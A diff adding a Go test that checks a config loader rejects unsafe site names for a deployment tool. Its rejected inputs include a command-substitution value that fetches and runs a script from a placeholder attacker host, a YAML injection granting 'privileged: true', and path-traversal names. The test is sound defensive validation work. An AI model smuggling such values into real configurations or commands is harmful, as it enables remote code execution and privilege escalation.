@@ -817,3 +817,16 @@ func TestAnAppNameIsOneWord(t *testing.T) {
 		}
 	}
 }
+
+// A site's name is written into compose files, shell scripts, HAProxy and
+// Patroni configuration, and a directory of `paisans render --out`, so it is
+// one lowercase word: anything else could add keys to a compose file, run a
+// command, or write outside the output directory.
+func TestASiteNameIsOneWord(t *testing.T) {
+	for _, name := range []string{`h\n    privileged: true`, `$(curl -s evil.example|sh)`, "..", ".", "a/b", "Home", "a b", "-x"} {
+		named := strings.Replace(validConfig, "sites:\n", "sites:\n  \""+name+"\":\n    roles: [witness]\n    address: 10.44.0.9\n    ssh:\n      host: w.local\n      user: ubuntu\n      keys: [alice]\n", 1)
+		if _, err := config.Load(write(t, named)); err == nil || !strings.Contains(err.Error(), "is not a site name") {
+			t.Errorf("%q: loaded, or refused without saying why: %v", name, err)
+		}
+	}
+}
